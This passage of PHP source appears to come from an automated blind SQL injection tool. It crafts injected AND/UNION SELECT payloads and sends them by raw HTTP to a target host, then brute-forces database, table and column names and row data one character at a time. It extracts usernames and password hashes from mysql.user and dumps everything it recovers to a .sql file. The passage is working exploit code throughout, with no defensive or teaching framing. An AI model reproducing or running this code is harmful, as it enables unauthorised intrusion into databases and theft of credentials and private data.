					if ($tquerycolumns)
					{
						$reg = $this->mparams;
						$qry = $this->space."UNION".$this->space."SELECT".$this->space."1";
						for ($x=1; $x<$tquerycolumns; $x++)
							$qry .= ",$x";
						$qry .= $this->space."FROM".$this->space.$tname.$this->end;
					}
					else
					{
						$reg = "/Operand\sshould\scontain\s(\d*)\scolumn/i";
						$qry = $this->space."AND".$this->space.
						"(
							SELECT".$this->space."*".$this->space.
							"FROM".$this->space.$tname.
						")".$this->end;
					}
					if ($this->query_send($qry))
					{
						$this->log("[*] Found table: $tname", 0);
						$ctables[$i]["table"] = $tname;
					}
					else if ($this->error)
						return false;
				}
				if (!count($ctables))
					$this->log("[-] No common tables found!", 0);

				// mysql
				$reg1 = "/\'mysql.db'\sdoesn\'t\sexist/i";
				$reg2 = "/denied\s[to|for]+\suser\s'(.*?)'@'(.*?)'\s[to|for]+\s[database|table]+\s'(.*?)'/i";
				$qry = $this->space."AND".$this->space.
					"(
						SELECT".$this->space."1".$this->space.
						"FROM".$this->space."mysql.db
					)".$this->end;
				$qry = preg_replace("/[\t|\r|\n]+/", "", $qry);
				$pkt = "GET ".$this->path.$qry.$this->rest." HTTP/1.0\r\n";
				$pkt .= "Host: ".$this->host."\r\n";
				$pkt .= "Connection: close\r\n\r\n";
				$data = $this->http_send($pkt);
				$bexist = !preg_match($reg1, $data);
				$bread = !preg_match($reg2, $data, $info);
				if ($bexist && $bread)
				{
					$this->log("[+] We have read access to 'mysql' (target database is running as root?)", 0);
					$this->log("[*] Bruteforcing amount of rows (users) in mysql.user", 0);
					$reg = $this->mparams;
					for ($i=1; $i<30; $i++)
					{
						$this->log("[*] Trying rows: $i", 2);
						$qry = $this->space."AND".$this->space.
							"(
								SELECT".$this->space.
								"(
									SELECT".$this->space."COUNT(User)".$this->space.
									"FROM".$this->space."mysql.user
								)=$i
							)".$this->end;
						$qry = preg_replace("/[\t|\r|\n]+/", "", $qry);
						$pkt = "GET ".$this->path.$qry.$this->rest." HTTP/1.0\r\n";
						$pkt .= "Host: ".$this->host."\r\n";
						$pkt .= "Connection: close\r\n\r\n";
						$data = $this->http_send($pkt);
						if (preg_match($reg, $data))
						{
							$this->log("[*] Found $i users in remote database", 0);
							$users = $i;
							break;
						}
					}
					if (!$users)
						$this->log("[-] No users found or >30", 0);

					$this->log("[*] Bruteforcing username length of users", 0);
					$reg = $this->mparams;
					for ($i=0; $i<$users; $i++)
					{
						for ($x=1; $x<30; $x++)
						{
							$this->log("[*] Trying length: $x", 2);
							$qry = $this->space."AND".$this->space.
							"(
								SELECT".$this->space.
								"(
									SELECT".$this->space."LENGTH(User)".$this->space.
									"FROM".$this->space."mysql.user".$this->space.
									"LIMIT".$this->space."$i,1
								)=$x
							)".$this->end;
							$qry = preg_replace("/[\t|\r|\n]+/", "", $qry);
							$pkt = "GET ".$this->path.$qry.$this->rest." HTTP/1.0\r\n";
							$pkt .= "Host: ".$this->host."\r\n";
							$pkt .= "Connection: close\r\n\r\n";
							$data = $this->http_send($pkt);
							if (preg_match($reg, $data))
							{
								$this->log("[*] Found username $i length: $x", 0);
								$user[$i]["length"] = $x;
								break;
							}
						}
						if (!$user[$i]["length"])
							$this->log("[-] Username length not found for user $i", 0);
					}

					$fields = array("User", "Password");
					$attack = array("username", "password");
					for ($a=0; $a<count($attack); $a++)
					{
						$what = $attack[$a];
						for ($i=0; $i<$users; $i++)
						{
							$start = 1;
							$length = ($a ? 41 : $user[$i]["length"]);
							if (!$length) continue;

							$user[$i]["id"] = $i;
							if ($length == 41)
							{
								$user[$i][$what] = '*';
								$start = 2;
							}
							$this->log("[*] Bruteforcing $what of $i in mysql.user", 1);
							for($index=$start; $index<=$length; $index++)
							{
								$found = false;
								$this->log("[*] Getting $what character at index $index of $length for user $i in mysql.user", 2);
								for ($c=0; $c<$this->charlen; $c++)
								{
									$char = ($a ? ord(strtoupper($this->charset[$c]["char"])) : ord($this->charset[$c]["char"]));
									$this->log("[*] Trying character ".chr($char)." ($char)", 2);
									$qry = $this->space."AND".$this->space.
										"(
											SELECT".$this->space."substr((
												SELECT".$this->space.$fields[$a].$this->space.
												"FROM".$this->space."mysql.user".$this->space.
												"LIMIT".$this->space.$i.",1
											),$index,1)=CHAR($char)
										)".$this->end;
									$qry = preg_replace("/[\t|\r|\n]+/", "", $qry);
									$pkt = "GET ".$this->path.$qry.$this->rest." HTTP/1.0\r\n";
									$pkt .= "Host: ".$this->host."\r\n";
									$pkt .= "Connection: close\r\n\r\n";
									$data = $this->http_send($pkt);
									if (preg_match($reg, $data))
									{
										$this->log("[+] Found $what character ".chr($char)." for index $index of $length", 1);
										$user[$i][$what] .= chr($char);
										$found = true;
										break;
									}
								}
								if (!$found)
								{
									$this->log("[-] Failed to retrieve $what char at index $index of $length for user $i", 0);
									break;
								}
							}
							if ($found)
							{
								$this->log("[+] Found $what for user $i: ".$user[$i][$what], 0);
							}
						}
					}
					$this->log("[*] Overview", 1);
					for ($i=0; $i<$users; $i++)
						$this->log("[+] User ".$user[$i]["id"].": ".$user[$i]["username"]."@".$user[$i]["password"], 0);
				}
				else if (!$bread)
					$this->log("[-] Access denied for user '".$info[1]."'@'".$info[2]."' to database '".$info[3]."'", 0);
				else
					$this->log("[-] Something went terribly wrong (mysql.db doesn't exist?)", 0);
			}
			break;

		}
		$this->log("[*] Generated ".$this->requests." requests", 0);
		return true;
	}

	private function get_brute_result($sub_qry, $use_charset=false, $start=0, $end=1000)
	{
		for ($i=$start; $i<=$end; $i++)
		{
			if ($use_charset)
			{
				if ($i > $this->charlen) return false;
				$char = $this->charset[$i]["char"];
				$qry = $this->space."AND".$this->space."(SELECT($sub_qry)=CHAR(".ord($char)."))".$this->end;
				$this->log("[*] Trying $i ($char)", 1);
			}
			else
			{
				$qry = $this->space."AND".$this->space."(SELECT($sub_qry)=$i)".$this->end;
				$this->log("[*] Trying $i", 1);
			}
			$res = $this->query_send($qry);
			if ($res) return ($use_charset ? $this->charset[$i]["char"] : $i);
		}
		return false;
	}

	private function get_smart_result($sub_qry, $use_charset=false, $gap=5, $max=500)
	{
		$max = round($max/$gap);
		for ($x=0; $x<=$max; $x++)
		{
			$start = ($x ? ($x*$gap)+1 : 0);
			$end = $start+$gap;
			if ($use_charset)
			{
				if ($start > $end)
					return false;
				else if ($end > $this->charlen)
					$end = $this->charlen;

				$schar = $this->charset[$start]["char"];
				$echar = $this->charset[$end]["char"];
				$qry = $this->space."AND".$this->space.
				"(
					SELECT(".$sub_qry.")".$this->space.
					"BETWEEN".$this->space."CHAR(".ord($schar).")".$this->space.
					"AND".$this->space."CHAR(".ord($echar).")
				)".$this->end;
				$this->log("[*] Trying range[$x]: $start ($schar) - $end ($echar)", 1);
			}
			else
			{
				$qry = $this->space."AND".$this->space.
				"(
					SELECT(".$sub_qry.")".$this->space.
					"BETWEEN".$this->space.$start.$this->space.
					"AND".$this->space.$end.
				")".$this->end;
				$this->log("[*] Trying range[$x]: $start - $end", 1);
			}
			if ($this->query_send($qry))
			{
				$this->log("[+] in range!\r\n", 2);
				return $this->get_brute_result($sub_qry, $use_charset, $start, $end);
			}
		}
		return false;
	}

	private function get_cache_result($qry, $use_charset=false)
	{
		$qry = "($qry)";
		$start = $this->cache_start;
		$qry = "(SELECT".$this->space."CASE".$this->space.$qry;
		for ($i=0; $i<$this->charlen; $i++)
		{
			$char = ($use_charset? "CHAR(".ord($this->charset[$i]["char"]).")" : $i);
			$page = $this->cache_list[$i]["page"];
			$qry .= $this->space."WHEN".$this->space.$char.$this->space."THEN".$this->space.$page;
		}
		$qry .= $this->space."END)".$this->end;
		$index = $this->query_send($qry);
		if ($index === false)
		{
			$this->log("[-] Result not found in cache, try other method or increase charset length", 0);
			return false;
		}
		return ($use_charset ? $index["char"] : $index["length"]);
	}

	private function get_result($qry, $use_charset=false, $param1=null, $param2=null)
	{
		switch ($this->method)
		{
			case METHOD_BRUTEFORCE:
				return $this->get_brute_result($qry, $use_charset, (isset($param1) ? $param1 : 0), (isset($param2) ? $param2 : 1000));

			case METHOD_BRUTEFORCE_SMART:
				return $this->get_smart_result($qry, $use_charset, (isset($param1) ? $param1 : 5), (isset($param2) ? $param2 : 500));

			case METHOD_CACHING:
				return $this->get_cache_result($qry, $use_charset);

			default:
				return false;
		}
	}

	private function getDatabaseCount()
	{
		if (isset($this->_db_info[$this->host]["databases"])) return $this->_db_info[$this->host]["databases"];
		$this->log("[*] Bruteforcing amount of rows (databases)", 1);
		$qry = "SELECT".$this->space."COUNT(SCHEMA_NAME)".$this->space.
			"FROM".$this->space."information_schema.SCHEMATA";
		return ($this->_db_info[$this->host]["databases"] = $this->get_result($qry));
	}

	private function getDatabaseNameLength($id)
	{
		if (isset($this->_db_info[$this->host][$id]["length"])) return $this->_db_info[$this->host][$id]["length"];
		$this->log("[*] Bruteforcing database name length for database index $id", 1);
		$qry = "SELECT".$this->space."LENGTH(SCHEMA_NAME)".$this->space.
			"FROM".$this->space."information_schema.SCHEMATA".$this->space.
			"LIMIT".$this->space."$id,1";
		return ($this->_db_info[$this->host][$id]["length"] = $this->get_result($qry));
	}

	private function getDatabaseName($id, $length)
	{
		if (isset($this->_db_info[$this->host][$id]["name"])) return $this->_db_info[$this->host][$id]["name"];
		$name = "";
		$this->log("[*] Bruteforcing database name for database index $id with length $length", 1);
		for($index=1; $index<=$length; $index++)
		{
			$found = false;
			$this->log("[*] Getting database name character at index $index of $length for database $id", 3);
			$qry = "SELECT".$this->space."substr((
					SELECT".$this->space."SCHEMA_NAME".$this->space.
					"FROM".$this->space."information_schema.SCHEMATA".$this->space.
					"LIMIT".$this->space."$id,1
				),$index,1)";

			$char = $this->get_result($qry, true);
			if ($char !== false)
			{
				$this->log("[+] Found database name character $char for index $index of $length", 2);
				$name .= $char;
			}
			else
			{
				$this->log("[-] Database name character for index $index of $length not found", 2);
				$name .= "?";
			}
		}
		return ($this->_db_info[$this->host][$id]["name"] = $name);
	}

	private function getTableCount($dat)
	{
		if (isset($this->_db_info[$this->host][$dat]["tables"])) return $this->_db_info[$this->host][$dat]["tables"];
		if (!strcmp($dat, "information_schema") || !strcmp($dat, "mysql")) return 0;
		$database = "";
		for ($i=0; $i<strlen($dat); $i++)
		{
			if ($i) $database .= ",";
			$database .= "CHAR(".ord($dat[$i]).")";
		}
		$this->log("[*] Bruteforcing amount of rows (tables) for database '$dat'", 1);
		$qry = "SELECT".$this->space."COUNT(TABLE_NAME)".$this->space.
			"FROM".$this->space."information_schema.TABLES".$this->space.
			"WHERE".$this->space."TABLE_SCHEMA=CONCAT($database)".$this->space.
			"AND".$this->space."TABLE_ROWS".$this->space."IS".$this->space."NOT".$this->space."NULL";
		return ($this->_db_info[$this->host][$dat]["tables"] = $this->get_result($qry));
	}

	private function getTableNameLength($dat, $id)
	{
		if (isset($this->_db_info[$this->host][$dat][$id]["length"])) return $this->_db_info[$this->host][$dat][$id]["length"];
		$database = "";
		for ($i=0; $i<strlen($dat); $i++)
		{
			if ($i) $database .= ",";
			$database.= "CHAR(".ord($dat[$i]).")";
		}
		$qry = "SELECT".$this->space."LENGTH(TABLE_NAME)".$this->space.
			"FROM".$this->space."information_schema.TABLES".$this->space.
			"WHERE".$this->space."TABLE_SCHEMA=CONCAT($database)".$this->space.
			"AND".$this->space."TABLE_ROWS".$this->space."IS".$this->space."NOT".$this->space."NULL".$this->space.
			"LIMIT".$this->space."$id,1";
		return ($this->_db_info[$this->host][$dat][$id]["length"] = $this->get_result($qry));
	}

	private function getTableName($dat, $id, $length)
	{
		if (isset($this->_db_info[$this->host][$dat][$id]["name"])) return $this->_db_info[$this->host][$dat][$id]["name"];
		$database = "";
		for ($i=0; $i<strlen($dat); $i++)
		{
			if ($i) $database .= ",";
			$database.= "CHAR(".ord($dat[$i]).")";
		}
		$name = "";
		$this->log("[*] Bruteforcing table name for table index $id with length $length in database '$dat'", 1);
		for($index=1; $index<=$length; $index++)
		{
			$found = false;
			$this->log("[*] Getting table name character at index $index of $length for table $id in database '$dat'", 3);
			$qry = "SELECT".$this->space."substr((
					SELECT".$this->space."TABLE_NAME".$this->space.
					"FROM".$this->space."information_schema.TABLES".$this->space.
					"WHERE".$this->space."TABLE_SCHEMA=CONCAT($database)".$this->space.
					"AND".$this->space."TABLE_ROWS".$this->space."IS".$this->space."NOT".$this->space."NULL".$this->space.
					"LIMIT".$this->space."$id,1
				),$index,1)";

			$char = $this->get_result($qry, true);
			if ($char !== false)
			{
				$this->log("[+] Found table name character $char for index $index of $length", 2);
				$name .= $char;
			}
			else
			{
				$this->log("[-] Table name character for index $index of $length not found", 2);
				$name .= "?";
			}
		}
		return ($this->_db_info[$this->host][$dat][$id]["name"] = $name);
	}

	private function getColumnCount($dat, $tab)
	{
		if (isset($this->_db_info[$this->host][$dat][$tab]["columns"])) return $this->_db_info[$this->host][$dat][$tab]["columns"];
		$database = "";
		for ($i=0; $i<strlen($dat); $i++)
		{
			if ($i) $database .= ",";
			$database.= "CHAR(".ord($dat[$i]).")";
		}
		$table = "";
		for ($i=0; $i<strlen($tab); $i++)
		{
			if ($i) $table .= ",";
			$table .= "CHAR(".ord($tab[$i]).")";
		}

		$this->log("[*] Bruteforcing amount of rows (columns) for table '$tab'", 1);
		$qry = "SELECT".$this->space.
			"COUNT(COLUMN_NAME)".$this->space.
			"FROM".$this->space."information_schema.COLUMNS".$this->space.
			"WHERE".$this->space."TABLE_SCHEMA=CONCAT($database)".$this->space.
			"AND".$this->space."TABLE_NAME=CONCAT($table)";
		return ($this->_db_info[$this->host][$dat][$tab]["columns"] = $this->get_result($qry));
	}

	private function getColumnNameLength($dat, $tab, $id)
	{
		if (isset($this->_db_info[$this->host][$dat][$tab][$id]["length"])) return $this->_db_info[$this->host][$dat][$tab][$id]["length"];
		$database = "";
		for ($i=0; $i<strlen($dat); $i++)
		{
			if ($i) $database .= ",";
			$database.= "CHAR(".ord($dat[$i]).")";
		}
		$table = "";
		for ($i=0; $i<strlen($tab); $i++)
		{
			if ($i) $table .= ",";
			$table .= "CHAR(".ord($tab[$i]).")";
		}

		$this->log("[*] Bruteforcing column name length for column $id in table '$tab'", 1);
		$qry = "SELECT".$this->space."LENGTH(COLUMN_NAME)".$this->space.
			"FROM".$this->space."information_schema.COLUMNS".$this->space.
			"WHERE".$this->space."TABLE_SCHEMA=CONCAT($database)".$this->space.
			"AND".$this->space."TABLE_NAME=CONCAT($table)".$this->space.
			"LIMIT".$this->space."$id,1";
		return ($this->_db_info[$this->host][$dat][$tab][$id]["length"] = $this->get_result($qry));
	}

	private function getColumnName($dat, $tab, $id, $length)
	{
		if (isset($this->_db_info[$this->host][$dat][$tab][$id]["name"])) return $this->_db_info[$this->host][$dat][$tab][$id]["name"];
		$database = "";
		for ($i=0; $i<strlen($dat); $i++)
		{
			if ($i) $database .= ",";
			$database.= "CHAR(".ord($dat[$i]).")";
		}
		$table = "";
		for ($i=0; $i<strlen($tab); $i++)
		{
			if ($i) $table .= ",";
			$table .= "CHAR(".ord($tab[$i]).")";
		}

		$name = "";
		$this->log("[*] Bruteforcing column name for column $id with length $length in table '$tab' in database '$dat'", 1);
		for($index=1; $index<=$length; $index++)
		{
			$this->log("[*] Getting column name character at index $index of $length for column $id", 3);
			$qry = "SELECT".$this->space."substr((
						SELECT".$this->space."COLUMN_NAME".$this->space.
						"FROM".$this->space."information_schema.COLUMNS".$this->space.
						"WHERE".$this->space."TABLE_SCHEMA=CONCAT($database)".$this->space.
						"AND".$this->space."TABLE_NAME=CONCAT($table)".$this->space.
						"LIMIT".$this->space."$id,1
					),$index,1)";

			$char = $this->get_result($qry, true);
			if ($char !== false)
			{
				$this->log("[+] Found column name character $char for index $index of $length", 2);
				$name .= $char;
			}
			else
			{
				$this->log("[-] Column name character for index $index of $length not found", 2);
				$name .= "?";
			}
		}
		return ($this->_db_info[$this->host][$dat][$tab][$id]["name"] = $name);
	}

	private function getRowCount($database, $table, $column)
	{

		$this->log("[*] Bruteforcing amount of rows in column '$column' in table '$table' in database '$database'", 1);
		$qry = "SELECT".$this->space."COUNT($column)".$this->space.
			"FROM".$this->space."$database.$table";
		$rows = $this->get_result($qry);
		if ($rows > $this->_db_info[$this->host][$database][$table]["rows"]) $this->_db_info[$this->host][$database][$table]["rows"] = $rows;
		return ($rows);
	}

	private function getRowDataLength($database, $table, $column, $row)
	{
		if (isset($this->_db_info[$this->host][$database][$table][$column][$row]["length"])) return $this->_db_info[$this->host][$database][$table][$column][$row]["length"];
		$this->log("[*] Bruteforcing row data length for row $row in column '$column' in table '$table' in database '$database'", 1);
		$qry = "SELECT".$this->space."LENGTH($column)".$this->space.
			"FROM".$this->space."$database.$table".$this->space.
			"LIMIT".$this->space."$row,1";
		return ($this->_db_info[$this->host][$database][$table][$column][$row]["length"] = $this->get_result($qry));
	}

	private function getRowData($database, $table, $column, $row, $length)
	{
		if (isset($this->_db_info[$this->host][$database][$table][$column][$row]["data"])) return $this->_db_info[$this->host][$database][$table][$column][$row]["data"];
		$rdata = "";
		$this->log("[*] Bruteforcing row data for row $row in column '$column' in table '$table' in database '$database'", 1);
		for($index=1; $index<=$length; $index++)
		{
			$found = false;
			$this->log("[*] Getting row data character at index $index of $length for row $row in column '$column' in table '$table' in database '$database'", 3);
			$qry = "SELECT".$this->space."substr((
						SELECT".$this->space."$column".$this->space.
						"FROM".$this->space."$database.$table".$this->space.
						"LIMIT".$this->space."$row,1
					),$index,1)";

			$char = $this->get_result($qry, true);
			if ($char !== false)
			{
				$this->log("[+] Found row data character $char for index $index of $length", 2);
				$rdata .= $char;
			}
			else
			{
				$this->log("[-] Row data character for index $index of $length not found", 2);
				$rdata .= "?";
			}
		}
		return ($this->_db_info[$this->host][$database][$table][$column][$row]["data"] = $rdata);
	}

	private function getDatabaseVersion()
	{
		if (isset($this->_db_info[$this->host]["version"])) return $this->_db_info[$this->host]["version"];
		$qry = "SELECT".$this->space."SUBSTRING((SELECT".$this->space."version()),1,1)";
		return ($this->_db_info[$this->host]["version"] = $this->get_result($qry));
	}

	public function show_database_info()
	{
		$hosts = $this->_db_info;
		$this->log("[+] Total hosts: ".count($hosts), 0);
		foreach ($hosts as $host => $info)
		{
			$this->log("\r\n", 0);
			$this->log("\t[+] Host: ".$info["name"], 0);
			$this->log("\t[+] MySQL Version: ".(isset($info["version"]) ? $info["version"] : "not found"), 0);
			$this->log("\t[+] Databases: ".intval($info["databases"]), 0);
			for ($b=0; $b<$info["databases"]; $b++)
			{
				$name = $info[$b]["name"];
				$dbs = $info[$name];
				if (empty($name)) continue;
				$this->log("\r\n", 0);
				$this->log("\t\t[+] Database $b: $name", 0);
				$this->log("\t\t[+] Tables: ".intval($dbs["tables"]), 0);
				for ($c=0; $c<$dbs["tables"]; $c++)
				{
					$name = $dbs[$c]["name"];
					$tables = $dbs[$name];
					if (empty($name)) continue;
					$this->log("\r\n", 0);
					$this->log("\t\t\t[+] Table $c: $name", 0);
					$this->log("\t\t\t[+] Columns: ".intval($tables["columns"]), 0);
					$this->log("\t\t\t[+] Rows: ".intval($tables["rows"]), 0);
					for ($d=0; $d<$tables["columns"]; $d++)
					{
						$name = $tables[$d]["name"];
						$columns = $tables[$name];
						if (empty($name)) continue;
						$this->log("\t\t\t\t[+] Column $d: $name", 0);
						for ($e=0; $e<$tables["rows"]; $e++)
						{
							$row = $columns[$e];
							$this->log("\t\t\t\t\t[+] Row: $e", 0);
							$this->log("\t\t\t\t\t[+] Data Length: ".intval($row["length"]), 0);
							$this->log("\t\t\t\t\t[+] Data: ".$row["data"], 0);
							$this->log("\r\n", 0);
						}
					}
				}
			}
		}
		$this->dump_database_info();
		return true;
	}

	public function dump_database_info()
	{
		$hosts = $this->_db_info;
		foreach ($hosts as $host => $info)
		{
			$h = fopen($info["name"]."_".time().".sql", "w+") or die("FAILED OMG BLAAT w00t");
			for ($b=0; $b<$info["databases"]; $b++)
			{
				$name = $info[$b]["name"];
				$dbs = $info[$name];
				if (empty($name)) continue;
				fwrite($h, "CREATE DATABASE $name;\r\nUSE $name;\r\n");
				for ($c=0; $c<$dbs["tables"]; $c++)
				{
					$name = $dbs[$c]["name"];
					$tables = $dbs[$name];
					if (empty($name)) continue;
					$buffered1 = "INSERT INTO $name (";
					fwrite($h, "CREATE TABLE $name (");
					for ($d=0; $d<$tables["columns"]; $d++)
					{
						$name = $tables[$d]["name"];
						$columns = $tables[$name];
						if (empty($name)) continue;
						if ($d)
						{
							$buffered1 .= ",";
							fwrite($h, ",");
						}
						$buffered1 .= "$name";
						fwrite($h, "\r\n\t$name text default NULL");
					}
					$buffered1 .= ") VALUES ";
					fwrite($h, "\r\n) ENGINE=InnoDB DEFAULT CHARSET=latin1;\r\n\r\n");
					for ($e=0; $e<$tables["rows"]; $e++)
					{
						if ($e) $buffered1 .= ",";
						$buffered1 .= "\r\n\t(";
						for ($d=0; $d<$tables["columns"]; $d++)
						{
							if ($d) $buffered1 .= ",";
							$name = $tables[$d]["name"];
							$data = $tables[$name][$e]["data"];
							$buffered1 .= "'$data'";
						}
						$buffered1 .= ")";
					}
					$buffered1 .= ";\r\n\r\n";
					if ($tables["rows"])
						fwrite($h, $buffered1);
				}
				fwrite($h, "\r\n");
			}
			fclose($h);
		}
	}

	// # --> TODO <-- #
	// Search functions for history/cache array
	// Host -> Database -> Table -> Column -> Row
	// Row
	private function addToRow($field, $value, $row=0, $column=0, $table=0, $db=0)
	{
		$host = ($host ? $host : $this->host);
		$db = ($db ? $db : $this->database);
		$table = ($table ? $table : $this->table);
		$column = ($column ? $column : $this->column);
		$row = ($row ? $row : $this->row);
		$field = $this->_db_structure[$host][$db][$table][$column][$row][$field];
		if (!isset($field))
		{
			$field = $value;
			return true;
		}
		return false;
	}
	// Column
	private function addColumn($field, $value, $column=0, $table=0, $db=0)
	{
		$host = $this->host;
		$db = ($db ? $db : $this->database);
		$table = ($table ? $table : $this->table);
		$column = ($column ? $column : $this->column);
		$field = $this->_db_structure[$host][$db][$table][$column][$field];
		if (!isset($field))
		{
			$field = $value;
			return true;
		}
		return false;
	}
	// Table
	private function addToTable($field, $value, $table=0, $db=0)
	{
		$host = $this->host;
		$db = ($db ? $db : $this->database);
		$table = ($table ? $table : $this->table);
		$field = $this->_db_structure[$host][$table][$field];
		if (!isset($field))
		{
			$field = $value;
			return true;
		}
		return false;
	}
	// Database
	private function addToDatabase($field, $value)
	{
		$host = $this->host;
		$field = $this->_db_structure[$host][$field];
		if (!isset($field))
		{
			$field = $value;
			return true;
		}
		return false;
	}
	// Host
}
?>
